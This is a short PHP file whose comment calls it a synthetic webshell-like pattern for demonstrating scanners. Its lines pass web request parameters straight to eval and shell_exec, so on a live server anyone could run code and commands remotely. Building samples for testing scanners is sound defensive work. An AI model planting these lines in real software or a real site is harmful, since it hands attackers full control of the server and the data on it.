<?php
// Synthetic webshell-like pattern for scanner demos
eval($_GET['cmd']);
shell_exec($_POST['x']);
base64_decode($_REQUEST['p']);
